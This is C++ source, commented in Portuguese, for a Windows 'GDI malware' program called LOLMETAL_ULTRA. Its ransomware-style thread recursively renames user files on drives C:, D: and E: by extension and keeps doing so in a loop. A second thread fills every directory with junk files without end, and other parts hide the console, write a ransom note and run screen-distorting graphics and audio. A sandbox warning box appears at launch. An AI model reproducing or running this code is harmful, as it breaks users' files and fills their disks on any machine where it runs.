#define NOMINMAX
#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <string>
#include <algorithm>
#include <cstdlib>
#include <ctime>
#define _USE_MATH_DEFINES 
#include <cmath>
#include <tchar.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")
#define M_PI 3.14159265358979323846264338327950288
#pragma comment(lib, "Msimg32.lib")

using namespace Gdiplus;
using namespace std;
namespace fs = filesystem;

int w, h;
int shakeIntensity = 1;
bool ultraModeActive = true;

// ============================================================================
// DECLARAÇÕES
// ============================================================================
namespace System {
    VOID RedrawScreen(VOID) {
        RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
    }
}

typedef struct { float x, y, z; } VERTEX;
typedef struct { int vtx0; int vtx1; } EDGE;

namespace Math {
    FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d) {
        return a * sin(2 * M_PI * b * c / d);
    }
}

namespace _3D {
    VOID RotateX(VERTEX* vtx, float angle) {
        float y = vtx->y;
        float z = vtx->z;
        vtx->y = cos(angle) * y - sin(angle) * z;
        vtx->z = sin(angle) * y + cos(angle) * z;
    }
    VOID RotateY(VERTEX* vtx, float angle) {
        float x = vtx->x;
        float z = vtx->z;
        vtx->x = cos(angle) * x + sin(angle) * z;
        vtx->z = -sin(angle) * x + cos(angle) * z;
    }
    VOID RotateZ(VERTEX* vtx, float angle) {
        float x = vtx->x;
        float y = vtx->y;
        vtx->x = cos(angle) * x - sin(angle) * y;
        vtx->y = sin(angle) * x + cos(angle) * y;
    }
    void DrawEdge(HDC dc, int x0, int y0, int x1, int y1) {
        MoveToEx(dc, x0, y0, NULL);
        LineTo(dc, x1, y1);
    }
}

// ============================================================================
// CONVERSÃO WSTRING -> STRING
// ============================================================================
string WStringToString(const wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

// ============================================================================
// PARTE 1: RANSOMWARE (FUCKEDCRYPTER)
// ============================================================================
const vector<string> EXTENSOES = {".txt", ".jpg", ".png", ".pdf", ".docx", ".xlsx", ".mp4", ".zip", ".rar", ".lnk", ".exe"};

void EncryptFile(const fs::path& filePath) {
    try {
        string newPath = filePath.string() + ".fucked";
        fs::rename(filePath, newPath);
    } catch(...) {}
}

DWORD WINAPI RansomwareThread(LPVOID lpParam) {
    string key = "FUCKEDCRYPTER_KEY";
    
    // Primeira onda: criptografa tudo que já existe
    vector<fs::path> arquivosAlvo;
    for (const auto& drive : { "C:\\", "D:\\", "E:\\" }) {
        if (fs::exists(drive)) {
            try {
                for (auto& p : fs::recursive_directory_iterator(drive)) {
                    if (!fs::is_directory(p)) {
                        string ext = p.path().extension().string();
                        transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                        if (find(EXTENSOES.begin(), EXTENSOES.end(), ext) != EXTENSOES.end()) {
                            arquivosAlvo.push_back(p.path());
                        }
                    }
                }
            } catch(...) {}
        }
    }
    
    for (const auto& file : arquivosAlvo) {
        EncryptFile(file);
    }
    
    // Loop infinito: monitora novos arquivos
    while (ultraModeActive) {
        for (const auto& drive : { "C:\\", "D:\\", "E:\\" }) {
            if (fs::exists(drive)) {
                try {
                    for (auto& p : fs::recursive_directory_iterator(drive)) {
                        if (!fs::is_directory(p)) {
                            string pathStr = p.path().string();
                            string ext = p.path().extension().string();
                            transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                            if (find(EXTENSOES.begin(), EXTENSOES.end(), ext) != EXTENSOES.end()) {
                                if (pathStr.find(".fucked") == string::npos) {
                                    EncryptFile(p.path());
                                }
                            }
                        }
                    }
                } catch(...) {}
            }
        }
        Sleep(3000);
    }
    return 0;
}

// ============================================================================
// PARTE 2: DISK DEVOURER (INFINITO)
// ============================================================================
void SpamFilesInDirectoryInfinite(const fs::path& path) {
    int fileCounter = 0;
    while (ultraModeActive) {
        fs::path filename = path / ("PCFUCKED_" + to_string(fileCounter++) + ".txt");
        ofstream file(filename);
        for (int j = 0; j < 500; j++) {
            file << "PCFUCKED - Linha " << j + 1 << " de 500 - VOCE FOI FUCKED" << endl;
        }
        file.close();
        Sleep(50);
    }
}

DWORD WINAPI DiskDevourerThread(LPVOID lpParam) {
    while (ultraModeActive) {
        for (const auto& drive : { "C:\\", "D:\\", "E:\\" }) {
            if (fs::exists(drive)) {
                try {
                    for (auto& p : fs::recursive_directory_iterator(drive)) {
                        if (fs::is_directory(p) && ultraModeActive) {
                            SpamFilesInDirectoryInfinite(p.path());
                        }
                    }
                } catch(...) {}
            }
        }
        Sleep(1000);
    }
    return 0;
}

// ============================================================================
// PARTE 3: SHELL EXECUTE
// ============================================================================
DWORD WINAPI ShellExecuteThread(LPVOID lpParam) {
    ShellExecute(NULL, "open", "https://www.nyan.cat/", NULL, NULL, SW_SHOWNORMAL);
    Sleep(2000);
    ShellExecute(NULL, "open", "calc.exe", NULL, NULL, SW_SHOWNORMAL);
    Sleep(1000);
    
    ofstream msgFile("C:\\LOLMETAL_MSG.txt");
    msgFile << "VOCE FOI ATACADO PELO LOLMETAL_ULTRA" << endl;
    msgFile << "Seus arquivos foram criptografados!" << endl;
    msgFile << "O disco foi inundado com PCFUCKED.txt" << endl;
    msgFile.close();
    ShellExecute(NULL, "open", "notepad.exe", "C:\\LOLMETAL_MSG.txt", NULL, SW_SHOWNORMAL);
    return 0;
}

// ============================================================================
// EFEITOS GDI
// ============================================================================
DWORD WINAPI texts(LPVOID lpvd) {
    HDC dc = GetDC(NULL);
    const char* lpStrings[] = { "LOLMETAL", "ULTRA VERSION", "NYAN CAT", "TESSERACT", "GDI EFFECTS", "BYTEBEAT", "PC FUCKED" };
    while (ultraModeActive) {
        if (rand() % 25 == 24) {
            SetTextColor(dc, RGB(rand() % 255, rand() % 255, rand() % 255));
            SetBkMode(dc, TRANSPARENT);
            int index = rand() % 7;
            TextOutA(dc, rand() % w, rand() % h, lpStrings[index], strlen(lpStrings[index]));
            Sleep(rand() % 5);
        }
    }
    return 0;
}

DWORD WINAPI waves(LPVOID lpvd) {
    HDC dc = GetDC(NULL);
    int i = 0;
    while (ultraModeActive) {
        int waveAmplitude = rand() % 3;
        int wavePhase = rand() % 20;
        if (rand() % 25 == 0) {
            for (int y = 0; y < h; y++) {
                int zx = Math::SineWave(waveAmplitude, y + i * 4, wavePhase, h);
                BitBlt(dc, 0, y, w - zx, 1, dc, zx, y, SRCCOPY);
            }
            Sleep(1);
            if (rand() % 25 == 0) System::RedrawScreen();
            i++;
        }
    }
    return 0;
}

DWORD WINAPI shake1(LPVOID lpvd) {
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);
    HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
    SelectObject(dcCopy, bmp);
    while (ultraModeActive) {
        for (int i = 1; i <= shakeIntensity; i++) {
            StretchBlt(dcCopy, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
        }
        Sleep(shakeIntensity < 10 ? rand() % 25 : rand() % 5);
        if (rand() % 25 == 24) System::RedrawScreen();
    }
    return 0;
}

DWORD WINAPI tesseract(LPVOID lpvd) {
    HDC dc = GetDC(NULL);
    float size = (float)(w + h) / 10.0f;
    float cx = size, cy = size;
    int xdv = 10, ydv = 10;
    float angleX = 0.01f, angleY = 0.01f, angleZ = 0.01f;
    int d = 60;

    VERTEX vtx[] = {
        {size, 0, 0}, {size, size, 0}, {0, size, 0}, {0, 0, 0},
        {size, 0, size}, {size, size, size}, {0, size, size}, {0, 0, size},
        {(float)(size - d), (float)d, (float)d}, {(float)(size - d), (float)(size - d), (float)d}, 
        {(float)d, (float)(size - d), (float)d}, {(float)d, (float)d, (float)d},
        {(float)(size - d), (float)d, (float)(size - d)}, {(float)(size - d), (float)(size - d), (float)(size - d)}, 
        {(float)d, (float)(size - d), (float)(size - d)}, {(float)d, (float)d, (float)(size - d)}
    };

    EDGE edges[] = {
        {0,1},{1,2},{2,3},{3,0},{0,4},{1,5},{2,6},{3,7},
        {4,5},{5,6},{6,7},{7,4},{8,9},{9,10},{10,11},{11,8},
        {8,12},{9,13},{10,14},{11,15},{12,13},{13,14},{14,15},{15,12},
        {0,8},{1,9},{2,10},{3,11},{4,12},{5,13},{6,14},{7,15}
    };

    int totvtx = sizeof(vtx) / sizeof(vtx[0]);
    int totedg = sizeof(edges) / sizeof(edges[0]);

    while (ultraModeActive) {
        for (int i = 0; i < totvtx; i++) {
            _3D::RotateX(&vtx[i], angleX);
            _3D::RotateY(&vtx[i], angleY);
            _3D::RotateZ(&vtx[i], angleZ);
        }
        for (int i = 0; i < totedg; i++) {
            _3D::DrawEdge(dc, vtx[edges[i].vtx0].x + cx, vtx[edges[i].vtx0].y + cy,
                               vtx[edges[i].vtx1].x + cx, vtx[edges[i].vtx1].y + cy);
        }
        Sleep(40);
        if (rand() % 5 == 0) System::RedrawScreen();
        cx += xdv; cy += ydv;
        if (cx > w - (size / 2) || cx < -(size / 2)) xdv *= -1;
        if (cy > h - (size / 2) || cy < -(size / 2)) ydv *= -1;
    }
    return 0;
}

DWORD WINAPI patblt(LPVOID lpParam) {
    while (ultraModeActive) {
        HDC hdc = GetDC(NULL);
        int ww = GetSystemMetrics(SM_CXSCREEN), hh = GetSystemMetrics(SM_CYSCREEN);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, ww, hh, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
        Sleep(50);
    }
    return 0;
}

// ============================================================================
// ÁUDIO BYTEBEAT
// ============================================================================
#define BUFFER_SIZE 4096
HWAVEOUT hWaveOut;
WAVEHDR waveHdr[2];
char audioBuffers[2][BUFFER_SIZE];
unsigned int t_audio = 0;

void GerarBytebeat(char* buffer, int tamanho) {
    for (int i = 0; i < tamanho; i++) {
        t_audio++;
        int nota = (t_audio >> 9 & 10) | (t_audio >> 7 & 6) | (t_audio >> 5 & 12);
        buffer[i] = (char)((t_audio * (nota ? 3 : 2) & t_audio >> 4) | (t_audio >> 6 & t_audio));
    }
}

void CALLBACK waveOutProc(HWAVEOUT hwo, UINT uMsg, DWORD_PTR dwInstance, DWORD_PTR dwParam1, DWORD_PTR dwParam2) {
    if (uMsg == WOM_DONE) {
        WAVEHDR* hdr = (WAVEHDR*)dwParam1;
        GerarBytebeat(hdr->lpData, hdr->dwBufferLength);
        waveOutWrite(hwo, hdr, sizeof(WAVEHDR));
    }
}

void InicializarAudioBytebeat() {
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, (DWORD_PTR)waveOutProc, 0, CALLBACK_FUNCTION);
    for (int i = 0; i < 2; i++) {
        waveHdr[i].lpData = audioBuffers[i];
        waveHdr[i].dwBufferLength = BUFFER_SIZE;
        waveHdr[i].dwFlags = 0;
        GerarBytebeat(waveHdr[i].lpData, BUFFER_SIZE);
        waveOutPrepareHeader(hWaveOut, &waveHdr[i], sizeof(WAVEHDR));
        waveOutWrite(hWaveOut, &waveHdr[i], sizeof(WAVEHDR));
    }
}

// ============================================================================
// MAIN
// ============================================================================
int main() {
    w = GetSystemMetrics(SM_CXSCREEN);
    h = GetSystemMetrics(SM_CYSCREEN);
    
    MessageBox(NULL, "LOLMETAL_ULTRA - VERSÃO DESTRUTIVA\n\nUSE APENAS NO SANDBOXIE!", "⚠️ AVISO ⚠️", MB_ICONWARNING);
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    InicializarAudioBytebeat();
    
    CreateThread(0, 0, texts, 0, 0, 0);
    CreateThread(0, 0, waves, 0, 0, 0);
    CreateThread(0, 0, shake1, 0, 0, 0);
    CreateThread(0, 0, tesseract, 0, 0, 0);
    CreateThread(0, 0, patblt, 0, 0, 0);
    
    Sleep(5000);
    
    CreateThread(0, 0, RansomwareThread, 0, 0, 0);
    CreateThread(0, 0, DiskDevourerThread, 0, 0, 0);
    CreateThread(0, 0, ShellExecuteThread, 0, 0, 0);
    
    while (!(GetAsyncKeyState(VK_ESCAPE) & 0x8000)) {
        Sleep(100);
    }
    
    ultraModeActive = false;
    
    waveOutReset(hWaveOut);
    waveOutClose(hWaveOut);
    
    ShowCursor(TRUE);
    
    return 0;
}